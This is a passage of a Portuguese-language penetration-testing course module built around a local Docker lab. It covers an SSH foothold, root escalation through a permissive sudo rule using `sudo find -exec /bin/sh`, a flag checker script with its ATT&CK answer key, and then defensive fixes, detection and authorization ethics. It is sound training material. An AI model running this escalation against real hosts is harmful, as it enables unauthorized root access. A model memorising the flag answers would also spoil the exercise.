+uid=1001(webadmin) gid=1001(webadmin) groups=1001(webadmin)
+webadmin@acme-web:~$ cat ~/user.txt
+FLAG{...}        # a Flag 1 — mande no cartão da tarefa
+```
+
+**Lição:** o foothold não foi exploit — foi recon (listagem de diretório) + uma credencial vazada e reusada. Exatamente a cadeia inicial da Capital One, em miniatura.
+</Solution>
+
+<FlagInput task="flag-foothold" />
+
+### 5.4 Desafio — do foothold à joia da coroa (Flag 2)
+
+**Você é `webadmin` agora.** O objetivo é virar `root` e ler `/root/crown.txt`. Reflexo da Trilha 6: não procure exploit — pergunte o que esta identidade pode fazer **a mais** do que deveria. Comece pela pergunta que custa um comando e abre a maioria dos hosts.
+
+<Hint title="Dica 1 — a pergunta certa">
+`sudo -l` lista o que você pode rodar como root. Rode e leia com atenção o que aparece **sem** pedir senha (`NOPASSWD`).
+</Hint>
+
+<Hint title="Dica 2 — do comando ao shell">
+Um binário comum liberado no sudo vira root se ele souber executar outro comando. Procure esse binário no GTFOBins, seção **Sudo** — ele tem um `-exec` que roda o que você mandar, como root.
+</Hint>
+
+<Solution title="Solução — confira só depois de tentar">
+A enumeração de privilégio começa por `sudo -l`:
+
+```console
+webadmin@acme-web:~$ sudo -l
+Matching Defaults entries for webadmin on acme-web:
+    env_reset, mail_badpass, use_pty
+
+User webadmin may run the following commands on acme-web:
+    (root) NOPASSWD: /usr/bin/find
+```
+
+`find` como root, sem senha (achado **F3**). O `find` tem `-exec`, que executa um comando para cada resultado — e, rodando como root, esse comando também roda como root. É o truque clássico do GTFOBins:
+
+```console
+webadmin@acme-web:~$ sudo /usr/bin/find . -maxdepth 0 -exec /bin/sh \;
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/crown.txt
+FLAG{...}        # a Flag 2 — mande no cartão da tarefa
+# cat /root/customers.csv
+id,name,ssn_last4,balance
+1,A. Cliente,4412,10523.40
+2,B. Cliente,9087,221.00
+```
+
+`uid=0`: root pleno. E o `customers.csv` ao lado mostra o que a joia da coroa protegia — os dados de clientes. **Lição:** o salto vertical foi uma única regra de sudo permissiva. Guarde a evidência (o `sudo -l` e o `id`): ela é o coração do achado crítico do relatório.
+</Solution>
+
+<FlagInput task="flag-crown-jewel" />
+
+### 5.5 Desafio — o relatório (Flag 3)
+
+Você comprometeu o host. No CTF, acabou. Aqui, **começa a entrega**. Transforme o que fez em três achados e mapeie cada um à sua técnica <GlossaryTerm term="MITRE ATT&CK">MITRE ATT&CK</GlossaryTerm> — o passo que, no 8.1, deu ao defensor uma narrativa acionável. Os três achados são:
+
+- **F1 — credencial exposta num arquivo** (o `deploy.conf.bak` servido pela listagem de diretório);
+- **F2 — conta válida reaproveitada** (a mesma senha abriu o SSH);
+- **F3 — regra de sudo permissiva** (`NOPASSWD: find`) que leva a root.
+
+Cada um corresponde a **uma** técnica no `attack.mitre.org`. Pesquise-as (é o trabalho de verdade do relatório) e monte o `report-findings.txt` com um ID por linha, **na ordem F1, F2, F3**. Depois rode o verificador: ele confere o mapeamento inteiro e só revela a flag se os três estiverem certos — um errado embaralha tudo.
+
+<CodeBlock
+  title="~/engajamento-acme/report-check.cjs"
+  lang="javascript"
+  code={`#!/usr/bin/env node
+// report-check.cjs - valida o mapeamento dos achados ao MITRE ATT&CK e,
+// se TODO o mapeamento estiver certo, imprime a flag do relatorio.
+// Uso:  node report-check.cjs report-findings.txt
+const fs = require("fs");
+const crypto = require("crypto");
+
+const CIPHERTEXT_HEX =
+  "d935c709a814450b97a538862e13cd4a642c2a4f6c24f1d71c8222d21734f97840524f8fdaacfa71019a";
+
+const file = process.argv[2] || "report-findings.txt";
+let lines;
+try {
+  lines = fs.readFileSync(file, "utf8")
+    .split("\\n").map((l) => l.trim().toUpperCase())
+    .filter((l) => l.length > 0);
+} catch {
+  console.error(\`Nao consegui ler \${file}. Crie o arquivo com um ID ATT&CK por linha (F1, F2, F3).\`);
+  process.exit(1);
+}
+if (lines.length !== 3) {
+  console.error(\`Esperava 3 linhas (uma por achado), recebi \${lines.length}.\`);
+  process.exit(1);
+}
+function keystream(seed, n) {
+  let out = Buffer.alloc(0), i = 0;
+  while (out.length < n) {
+    out = Buffer.concat([out, crypto.createHash("sha256").update(seed + ":" + i).digest()]);
+    i++;
+  }
+  return out.subarray(0, n);
+}
+const ct = Buffer.from(CIPHERTEXT_HEX, "hex");
+const ks = keystream(lines.join("\\n"), ct.length);
+const out = Buffer.alloc(ct.length);
+for (let i = 0; i < ct.length; i++) out[i] = ct[i] ^ ks[i];
+const text = out.toString("utf8");
+if (/^FLAG\\{[\\x20-\\x7e]*\\}$/.test(text)) {
+  console.log("Mapeamento correto! Flag do relatorio:\\n" + text);
+} else {
+  console.log("Mapeamento incorreto: ao menos um achado foi para a tecnica errada. Revise e tente de novo.");
+  process.exit(2);
+}`}
+/>
+
+<Hint title="Dica — onde procurar cada técnica">
+F1 é da família "Unsecured Credentials" (credencial guardada de forma insegura, num arquivo). F2 é sobre usar uma conta legítima para entrar ("Valid Accounts"). F3 é abuso de mecanismo de elevação via sudo. Os três têm IDs no formato `Txxxx` ou `Txxxx.yyy`.
+</Hint>
+
+<Solution title="Solução — confira só depois de tentar">
+O mapeamento correto:
+
+- **F1 — credencial em arquivo exposto →** `T1552.001` (Unsecured Credentials: Credentials In Files).
+- **F2 — conta válida reaproveitada →** `T1078` (Valid Accounts).
+- **F3 — sudo permissivo →** `T1548.003` (Abuse Elevation Control Mechanism: Sudo and Sudo Caching).
+
+```console
+$ printf '%s\n' 'T1552.001' 'T1078' 'T1548.003' > report-findings.txt
+$ node report-check.cjs report-findings.txt
+Mapeamento correto! Flag do relatorio:
+FLAG{...}        # a Flag 3 — mande no cartão da tarefa
+```
+
+E monte o esqueleto do relatório de verdade (o entregável do 8.4), uma linha por achado:
+
+```text
+# Relatorio - engajamento ACME (host: acme-web, 127.0.0.1)
+
+Resumo executivo: um host de transferencia de arquivos foi comprometido de ponta
+a ponta a partir da internet, sem exploit, por uma cadeia de 3 mas configuracoes.
+Risco: CRITICO (acesso total e dados de clientes expostos).
+
+| ID  | Achado                         | Risco    | ATT&CK     | Recomendacao (causa-raiz)                      |
+|-----|--------------------------------|----------|------------|------------------------------------------------|
+| F1  | Credencial em backup exposto   | Alto     | T1552.001  | Desligar autoindex; tirar segredos do web root |
+| F2  | Senha reusada no SSH           | Alto     | T1078      | Segredos unicos por uso; rotacionar; MFA       |
+| F3  | sudo NOPASSWD: find -> root    | Critico  | T1548.003  | Remover a regra; menor privilegio              |
+
+Plano de retest: reconstruir o host com os 3 cortes e confirmar que a cadeia quebra.
+```
+</Solution>
+
+<FlagInput task="flag-relatorio" />
+
+### 5.6 Limpeza e encerramento
+
+Pós-exploração profissional termina **deixando o ambiente como estava**. Você não plantou persistência (fora de escopo e desnecessário), e o host sobe com `--rm`, então some ao parar. Encerre e apague a imagem:
+
+```console
+# dentro do host, saia dos shells aninhados:
+# exit
+# exit
+$ docker rm -f acme && docker rmi acme:local
+$ echo "[$(date -u +%FT%TZ)] engajamento encerrado; host destruido" >> notes.md
+```
+
+## 6. Variações e aprofundamento
+
+**Engajamentos além do host único.** O seu projeto foi um host. Redes reais encadeiam: do `webadmin` você poderia achar uma chave SSH para outro servidor, e daí <GlossaryTerm term="pivoting">pivotar</GlossaryTerm> para um segmento interno (Trilha 5). O funil é o mesmo, repetido por host; o que cresce é a disciplina de documentar o <GlossaryTerm term="attack path">attack path</GlossaryTerm> inteiro, nó a nó.
+
+**Black-box, grey-box, assumed breach.** Você fez um teste black-box (começou de fora, sem informação). Num grey-box, o cliente te dá credenciais de usuário comum para testar o que um funcionário faria. No <GlossaryTerm term="assumed breach">assumed breach</GlossaryTerm>, parte-se do princípio de que o atacante já entrou (te dão um foothold) para medir **o que ele faz depois** — útil quando o cliente quer testar a detecção, não o perímetro.
+
+**Pentest x red team.** Um pentest cobre o escopo em largura e entrega achados priorizados. Um <GlossaryTerm term="red team">red team</GlossaryTerm> é diferente: simula um adversário específico, com objetivo único (chegar às joias da coroa sem ser pego) e foco em testar a **detecção** do <GlossaryTerm term="blue team">blue team</GlossaryTerm> — frequentemente num exercício de <GlossaryTerm term="purple team">purple team</GlossaryTerm>, em que os dois lados trabalham juntos. O método que você treinou serve aos dois; muda o objetivo e o contrato.
+
+**O relatório para dois públicos.** O melhor relatório fala com dois leitores no mesmo documento: o <GlossaryTerm term="executive summary">resumo executivo</GlossaryTerm> para quem decide (risco de negócio, em uma página, sem jargão) e o corpo técnico para quem corrige (evidência reproduzível, <GlossaryTerm term="proof of concept">proof of concept</GlossaryTerm> e a recomendação de causa-raiz). Escrever os dois bem é uma habilidade por si só.
+
+**Retest e o ciclo que fecha.** Entregar o relatório não encerra a relação: o <GlossaryTerm term="retest">retest</GlossaryTerm> volta depois da correção e confirma, achado a achado, o que foi de fato resolvido. Um achado "corrigido" que o retest reabre é informação valiosa — e é o que transforma um pentest de foto instantânea em processo de melhoria.
+
+## 7. Erros comuns
+
+- **Pular o pré-engajamento.** Começar a atacar "porque é só um lab" cria o hábito errado. Num engajamento real, atacar antes de ter escopo e autorização por escrito é crime. Sempre escreva o `scope.txt` primeiro.
+- **Inflar a severidade.** Marcar tudo como "crítico" para parecer que o teste achou muita coisa destrói a priorização — que é o produto. Use probabilidade × impacto honestamente; um achado informativo é informativo.
+- **Recomendação que trata o sintoma.** "Troque o `find`" não corrige nada — o GTFOBins tem dezenas de substitutos. Ataque a causa-raiz (a regra permissiva).
+- **Reconstruir de memória.** Se você não anotou o comando e colou a saída na hora, no fim vai parafrasear — e o achado deixa de ser reproduzível. Anote ao vivo, em UTC.
+- **`ssh` recusa a conexão.** Confirme que o contêiner está de pé (`docker ps`), que você usou `-p 2222` (a porta publicada, não a 22) e o host `127.0.0.1`. A senha não aparece na tela ao digitar — é normal.
+- **`sudo find ... -exec` não vira root.** Cheque o `sudo -l`: o comando precisa estar liberado **como root** e `NOPASSWD`. E o caminho tem de bater (`/usr/bin/find`), porque o `secure_path`/caminho absoluto importa no sudoers.
+- **A Flag 3 não sai.** O `report-check.cjs` exige **três** linhas, uma por achado, **na ordem F1, F2, F3**, com os IDs exatos (`T1552.001`, `T1078`, `T1548.003`). Um ID na linha errada embaralha a chave. Maiúsculas/minúsculas e espaços ele tolera.
+
+## 8. Boas práticas e segurança
+
+Como todo módulo, a visão fecha com a defesa — e aqui ela é dupla: **cortar a cadeia** do host ACME (o lado do <GlossaryTerm term="blue team">blue team</GlossaryTerm>) e a **higiene do profissional** que conduz o teste.
+
+### 8.1 Cortar a cadeia (quebre um elo que a cadeia cai)
+
+O atacante precisou dos três elos; o defensor fecha o engajamento cortando **qualquer** um — e o relatório diz qual rende mais.
+
+**Elo 1 — listagem de diretório + segredo no web root.** Desligue o `autoindex` e nunca deixe segredos sob o diretório servido pela web:
+
+```text
+# nginx: a correcao da causa-raiz
+server {
+    autoindex off;                 # nao listar diretorios
+    location ~ \.(bak|old|conf)$ {  # e nem servir arquivos sensiveis
+        deny all;
+    }
+}
+```
+
+**Elo 2 — credencial em arquivo e reaproveitada.** Segredos saem de arquivos em claro e vão para um cofre (secrets manager) ou variáveis de ambiente restritas ao processo; e **nunca** se reaproveita a mesma senha entre um serviço e uma conta de sistema. É o elo que derrubou a Capital One (credencial obtida e reusada) — e MFA no acesso remoto (como SSH) é o complemento barato.
+
+**Elo 3 — a regra de sudo permissiva (a causa-raiz do root).** `NOPASSWD` num binário que executa código arbitrário é dar root a quem puder rodá-lo. Audite o sudoers e aplique o <GlossaryTerm term="least privilege">menor privilégio</GlossaryTerm>:
+
+```console
+# auditar o que cada regra realmente permite:
+$ sudo grep -r '' /etc/sudoers /etc/sudoers.d/
+
+# corrigir: remover a regra perigosa
+$ sudo rm /etc/sudoers.d/webadmin
+```
+
+Se a conta precisa mesmo rodar algo como root, dê um binário que **não** permita escape de shell (nada de `find`, `awk`, `vim`, `less` — confira o GTFOBins antes), e nunca com `NOPASSWD` genérico. Remover este elo quebra o engajamento inteiro: sem ele, `webadmin` não chega a `root`.
+
+### 8.2 Detecção (a sequência, não o evento)
+
+Isolados, um `curl` num backup, um `ssh` e um `sudo find` passam batidos; é a **sequência** que denuncia. Um acesso a um `.bak` seguido de um login SSH bem-sucedido daquela mesma conta e, logo depois, um `sudo find -exec /bin/sh` chamando shell — isso é um padrão que o `auditd` e um EDR reconhecem como escalação de privilégio (tática **TA0004** do MITRE ATT&CK). Monitorar a cadeia, e não o evento solto, é o que encurta o <GlossaryTerm term="dwell time">dwell time</GlossaryTerm> — a lição definitiva da Equifax (8.1).
+
+### 8.3 Higiene de quem conduz o teste
+
+A capacidade técnica que o curso te deu precisa de contorno, agora mais do que nunca:
+
+- **Escopo e autorização, sempre.** O contêiner deste módulo é seu. Qualquer teste fora do seu ambiente exige <GlossaryTerm term="scope">escopo</GlossaryTerm> e autorização por escrito (Trilha 1). "Só queria testar" não é autorização — é a Lei 12.737/2012.
+- **OPSEC como padrão.** Trate até o seu lab como se houvesse produção do outro lado: não destrua dados, registre tudo, não faça barulho desnecessário. O hábito que você treina é o que você executa sob pressão.
+- **Segredos tratados como segredos.** Credenciais e dados de clientes que você encontrar num engajamento real nunca circulam em claro: vão no relatório pela via combinada nas regras de engajamento, e as credenciais são rotacionadas pelo cliente depois. A <GlossaryTerm term="chain of custody">cadeia de custódia</GlossaryTerm> vale também para proteger o que você achou.
+
+## 9. Exercícios
+
+Primeiro o quiz de teoria — ele conta para concluir o módulo e cobra o **método** do engajamento (contrato, risco, causa-raiz, relatório), não a decoreba de comandos:
+
+<Quiz task="quiz-final" />
+
+Depois, as três entregas do projeto (seção 5), que são as três flags do módulo:
+
+- **Flag 1 — foothold:** recon → listagem de diretório → credencial vazada e reusada → SSH como `webadmin`. Leia `/home/webadmin/user.txt`.
+- **Flag 2 — joia da coroa:** `sudo -l` → regra `NOPASSWD: find` → GTFOBins → root. Leia `/root/crown.txt`.
+- **Flag 3 — o relatório:** mapeie F1, F2, F3 ao MITRE ATT&CK e rode o `report-check.cjs`.
+
+Para ir além, **sem flag** (é o treino direto para a vida profissional):
+
+1. **Escreva o relatório completo** do engajamento ACME, com resumo executivo (uma página, sem jargão, para quem decide) e corpo técnico (evidência reproduzível e recomendação de causa-raiz por achado). É o entregável do 8.4 aplicado ao que você fez.
+2. **Faça o retest.** Aplique os três cortes da seção 8.1 no `Dockerfile`, reconstrua o host e prove que a cadeia **quebra** — que nenhuma das flags é mais alcançável. Provar que um corte fecha a classe é a melhor forma de internalizar a defesa.
+3. **Classifique honestamente.** Reescreva a coluna de risco dos três achados usando probabilidade × impacto e justifique cada severidade em uma frase. Depois compare com um score CVSS: bateu?
+
+## 10. Resumo e glossário
+
+**Pontos-chave:**
+
+- Um pentest é um **engajamento contratado**, não uma invasão: escopo, autorização por escrito e regras de engajamento vêm **antes** de qualquer ataque, e o entregável é o **relatório**.
+- O trabalho é um **funil**: pré-engajamento → execução (o laço recon → foothold → escalação → pós-exploração, com OPSEC e notas ao vivo) → entrega. Tudo desemboca no relatório.
+- Cada passo vira um **achado** pela esteira evidência → risco → técnica ATT&CK → recomendação. O **risco** é probabilidade × impacto (não "tudo crítico"), e a recomendação ataca a **causa-raiz** (não o sintoma).
+- Grandes incidentes — como a **Capital One (2019)**, ~106 milhões de pessoas — raramente são exploits geniais; são **cadeias de más configurações** que ninguém classificou nem corrigiu. O pentest existe para achá-las antes.
+- Defender é **cortar qualquer elo** da cadeia (listagem desligada, sem credencial reusada, sudo com menor privilégio) e monitorar a **sequência**, não o evento, para encurtar o dwell time.
+- O engajamento fecha com **debrief** e **retest** — o relatório só vale pela ação que provoca.
+
+### Termos deste módulo
+
+<ModuleGlossary />
+
+### Para ir além
+
+- [PTES — Reporting](http://www.pentest-standard.org/index.php/Reporting) — a seção de relatório do Penetration Testing Execution Standard, que dá a espinha do entregável.
+- [NIST SP 800-115 — Technical Guide to Information Security Testing and Assessment](https://csrc.nist.gov/pubs/sp/800/115/final) — o guia oficial do NIST para planejar e conduzir testes de segurança, do pré-engajamento ao relatório.
+- [MITRE ATT&CK](https://attack.mitre.org/) — o catálogo de técnicas para mapear cada achado; as três deste módulo são [T1552.001](https://attack.mitre.org/techniques/T1552/001/), [T1078](https://attack.mitre.org/techniques/T1078/) e [T1548.003](https://attack.mitre.org/techniques/T1548/003/).
+- [FIRST — CVSS](https://www.first.org/cvss/) — a fórmula padronizada para classificar a severidade de um achado de forma defensável.
+- [U.S. Department of Justice — condenação no caso Capital One (jun. 2022)](https://www.justice.gov/usao-wdwa/pr/former-seattle-tech-worker-convicted-wire-fraud-and-computer-intrusions) — a fonte primária do caso da seção 4.
